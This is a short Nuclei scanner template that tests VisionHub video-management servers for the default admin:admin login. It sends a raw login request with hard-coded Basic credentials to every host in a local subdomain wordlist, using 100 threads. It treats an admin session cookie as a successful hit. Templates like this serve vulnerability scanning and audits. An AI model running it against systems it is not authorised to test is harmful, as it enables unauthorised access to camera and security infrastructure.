# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: visionhub-default-login
info:
  name: VisionHub Default Login
  author: Techryptic (@Tech)
  severity: high
  description: Default Login of admin:admin on VisionHub application.
  tags: visionhub,default-login
  reference: https://www.qognify.com/products/visionhub/
http:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt

    threads: 100
    raw:
      - |
        POST /VisionHubWebApi/api/Login HTTP/1.1
        Host: {{Subdomains}}
        Authorization: Basic YWRtaW46YWRtaW4=
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Set-Cookie: admin"
        part: header
      - type: status
        status:
          - 200
